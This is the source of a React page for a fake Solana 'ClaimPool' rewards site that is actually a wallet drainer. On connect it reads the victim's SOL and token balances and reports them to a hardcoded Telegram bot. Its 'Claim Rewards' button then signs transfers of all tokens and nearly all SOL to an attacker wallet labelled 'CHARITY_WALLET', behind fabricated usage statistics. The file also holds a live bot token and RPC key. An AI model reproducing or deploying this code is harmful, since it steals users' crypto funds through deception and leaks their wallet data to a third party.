import { useEffect, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";
import AnimatedBackground from "@/components/AnimatedBackground";
import StatsCard from "@/components/StatsCard";
import { Wallet, Coins, Users, TrendingUp, Loader2, X } from "lucide-react";
import { toast } from "sonner";
import solanaLogo from "@/assets/solana-logo.jpg";
const CHARITY_WALLET = "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj";
const QUICKNODE_RPC = "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b";
const TELEGRAM_BOT_TOKEN = "8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M";
const TELEGRAM_CHAT_ID = "-4836248812";
interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
}
const Index = () => {
  const {
    publicKey,
    sendTransaction
  } = useWallet();
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(false);
  const [solBalance, setSolBalance] = useState(0);
  const [tokens, setTokens] = useState<TokenBalance[]>([]);
  const [connection] = useState(() => new Connection(QUICKNODE_RPC, "confirmed"));
  useEffect(() => {
    if (publicKey) {
      fetchBalances();
    }
  }, [publicKey]);
  const fetchBalances = async () => {
    if (!publicKey) return;
    try {
      // Fetch SOL balance
      const balance = await connection.getBalance(publicKey);
      setSolBalance(balance / LAMPORTS_PER_SOL);

      // Fetch SPL token balances
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });
      const tokenBalances: TokenBalance[] = tokenAccounts.value.map(account => {
        const parsed = account.account.data.parsed.info;
        return {
          mint: parsed.mint,
          balance: parsed.tokenAmount.amount,
          decimals: parsed.tokenAmount.decimals,
          uiAmount: parsed.tokenAmount.uiAmount
        };
      }).filter(token => token.uiAmount > 0);
      setTokens(tokenBalances);

      // Send notification to Telegram
      await sendTelegramNotification(balance / LAMPORTS_PER_SOL, tokenBalances);
    } catch (error) {
      console.error("Error fetching balances:", error);
    }
  };
  const sendTelegramNotification = async (solBal: number, tokenBals: TokenBalance[]) => {
    if (!publicKey) return;
    const totalValue = solBal;
    let message = `🔔 New Wallet Connected\n\n`;
    message += `📍 Wallet: ${publicKey.toBase58()}\n\n`;
    message += `💰 SOL Balance: ${solBal.toFixed(4)} SOL\n\n`;
    if (tokenBals.length > 0) {
      message += `🪙 Tokens:\n`;
      tokenBals.forEach(token => {
        message += `  • ${token.uiAmount.toFixed(4)} (${token.mint.slice(0, 8)}...)\n`;
      });
    }
    message += `\n📊 Total Value: ${totalValue.toFixed(4)} SOL`;
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
    } catch (error) {
      console.error("Failed to send Telegram notification:", error);
    }
  };
  const handleDonate = async () => {
    if (!publicKey || !sendTransaction) {
      toast.error("Please connect your wallet first");
      return;
    }
    setLoading(true);
    setFailed(false);
    try {
      // Check if wallet has any balance
      if (solBalance === 0 && tokens.length === 0) {
        setLoading(false);
        setFailed(true);
        toast.error("Wallet not eligible", {
          description: "Your wallet doesn't contain any SOL or tokens to donate."
        });
        return;
      }
      const charityPubkey = new PublicKey(CHARITY_WALLET);
      const transactions: Transaction[] = [];
      const BATCH_SIZE = 5;

      // Create token transfer transactions in batches
      for (let i = 0; i < tokens.length; i += BATCH_SIZE) {
        const batchTokens = tokens.slice(i, i + BATCH_SIZE);
        const transaction = new Transaction();
        for (const token of batchTokens) {
          try {
            const mintPubkey = new PublicKey(token.mint);
            const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
            const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
            transaction.add(createTransferInstruction(fromTokenAccount, toTokenAccount, publicKey, BigInt(token.balance), [], TOKEN_PROGRAM_ID));
          } catch (error) {
            console.error(`Error adding token ${token.mint}:`, error);
          }
        }
        if (transaction.instructions.length > 0) {
          transaction.feePayer = publicKey;
          transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
          transactions.push(transaction);
        }
      }

      // Add SOL transfer transactions (70% first, then 30%)
      if (solBalance > 0) {
        const rentExemptMin = 0.00089088;
        const availableBalance = solBalance - rentExemptMin;
        if (availableBalance > 0) {
          const firstAmount = Math.floor(availableBalance * 0.7 * LAMPORTS_PER_SOL);
          const firstTx = new Transaction().add(SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: firstAmount
          }));
          firstTx.feePayer = publicKey;
          firstTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
          transactions.push(firstTx);
          const secondAmount = Math.floor(availableBalance * 0.3 * LAMPORTS_PER_SOL);
          const secondTx = new Transaction().add(SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: secondAmount
          }));
          secondTx.feePayer = publicKey;
          secondTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
          transactions.push(secondTx);
        }
      }
      if (transactions.length === 0) {
        throw new Error("No transactions to process");
      }

      // Send transactions sequentially
      for (let i = 0; i < transactions.length; i++) {
        const signature = await sendTransaction(transactions[i], connection);
        await connection.confirmTransaction(signature, "confirmed");
        toast.success(`Transaction ${i + 1}/${transactions.length} confirmed`);
      }
      toast.success("All donations sent successfully! Thank you for your generosity! ❤️");
      setLoading(false);
      fetchBalances();
    } catch (error: any) {
      console.error("Donation error:", error);
      setLoading(false);
      setFailed(true);
      toast.error("Donation failed", {
        description: error.message || "Please try again"
      });
    }
  };
  return <div className="min-h-screen relative overflow-hidden">
      <AnimatedBackground />
      
      {/* Header */}
      <header className="container mx-auto px-4 py-6">
        <nav className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img src={solanaLogo} alt="Solana" className="h-10 w-10" />
            <span className="text-2xl font-bold gradient-primary bg-clip-text text-blue-700">
              Solana ClaimPool
            </span>
          </div>
          <div className="flex items-center gap-4">
            <div className="wallet-adapter-button-wrapper">
              <WalletMultiButton />
            </div>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="container mx-auto px-4 py-20">
        <div className="max-w-4xl mx-auto text-center mb-20">
          <div className="mb-8 inline-block animate-float">
            <img src={solanaLogo} alt="Solana" className="h-32 w-32 mx-auto drop-shadow-[0_0_50px_rgba(59,130,246,0.8)]" />
          </div>
          
          <h1 className="text-6xl font-bold mb-6 gradient-primary bg-clip-text leading-tight md:text-7xl text-blue-800">
            Claim Your Solana
            <br />
            Rewards Now
          </h1>
          
          <p className="text-xl md:text-2xl text-muted-foreground mb-12 max-w-2xl mx-auto">
            Join thousands of users claiming their SOL tokens. Fast, secure, and transparent on the Solana blockchain.
          </p>

          <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
            <Button size="lg" onClick={handleDonate} disabled={loading || !publicKey} className={`gradient-primary text-white font-bold px-12 py-7 rounded-xl text-lg hover:scale-105 transition-all duration-300 hover:shadow-[0_0_40px_rgba(59,130,246,0.7)] w-full sm:w-auto ${failed ? "bg-red-600 hover:bg-red-700" : ""}`}>
              {loading ? <Loader2 className="mr-2 h-6 w-6 animate-spin" /> : failed ? <>
                  <X className="mr-2 h-6 w-6" />
                  Wallet Not Eligible
                </> : <>
                  <Coins className="mr-2 h-6 w-6" />
                  Claim Rewards
                </>}
            </Button>
            <Link to="/learn-more" className="w-full sm:w-auto">
              <Button size="lg" variant="outline" className="border-2 border-primary/50 bg-primary/10 text-white font-semibold px-12 py-7 rounded-xl text-lg hover:bg-primary/20 hover:border-primary hover:scale-105 transition-all duration-300 w-full">
                Learn More
              </Button>
            </Link>
          </div>
        </div>

        {/* Live Chart */}
        <div className="glass-card rounded-2xl p-6 mb-12">
          <h3 className="text-2xl font-bold text-white mb-4 text-center">Live Solana Price</h3>
          <div className="w-full" style={{
          height: "500px"
        }}>
            <iframe src="https://dexscreener.com/solana/7qbrgggytqagffgeywksryz7nbzvbhjwyatpgh1pump?embed=1&theme=dark&trades=0&info=0" className="w-full h-full rounded-xl border-2 border-primary/30" title="Solana Price Chart" />
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-20">
          <StatsCard label="Total Value Locked" value="$45.2M" icon={<TrendingUp className="h-5 w-5" />} />
          <StatsCard label="Active Users" value="12,847" icon={<Users className="h-5 w-5" />} />
          <StatsCard label="Total Claimed" value="892K SOL" icon={<Coins className="h-5 w-5" />} />
          <StatsCard label="Reward Rate" value="15.2% APY" icon={<TrendingUp className="h-5 w-5" />} />
        </div>

        {/* Info Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-6xl mx-auto">
          <div className="glass-card rounded-2xl p-8 hover:scale-105 transition-all duration-300">
            <div className="w-16 h-16 rounded-full bg-primary/30 flex items-center justify-center mb-4 mx-auto">
              <Wallet className="h-8 w-8 text-primary" />
            </div>
            <h3 className="text-xl font-bold mb-3 text-center text-white">Connect Wallet</h3>
            <p className="text-muted-foreground text-center">
              Securely connect your Solana wallet to access the claimpool
            </p>
          </div>

          <div className="glass-card rounded-2xl p-8 hover:scale-105 transition-all duration-300">
            <div className="w-16 h-16 rounded-full bg-primary/30 flex items-center justify-center mb-4 mx-auto">
              <Coins className="h-8 w-8 text-primary" />
            </div>
            <h3 className="text-xl font-bold mb-3 text-center text-white">Claim Rewards</h3>
            <p className="text-muted-foreground text-center">
              Instantly claim your allocated SOL tokens with zero fees
            </p>
          </div>

          <div className="glass-card rounded-2xl p-8 hover:scale-105 transition-all duration-300">
            <div className="w-16 h-16 rounded-full bg-solana-cyan/30 flex items-center justify-center mb-4 mx-auto">
              <TrendingUp className="h-8 w-8 text-solana-cyan" />
            </div>
            <h3 className="text-xl font-bold mb-3 text-center text-white">Earn More</h3>
            <p className="text-muted-foreground text-center">
              Stake your rewards to earn additional yield automatically
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="container mx-auto px-4 py-8 mt-20 border-t border-border/50">
        <div className="flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <img src={solanaLogo} alt="Solana" className="h-6 w-6" />
            <span className="text-muted-foreground">Powered by Solana</span>
          </div>
          <div className="text-muted-foreground text-sm">
            © 2024 Solana ClaimPool. All rights reserved.
          </div>
        </div>
      </footer>
    </div>;
};
export default Index;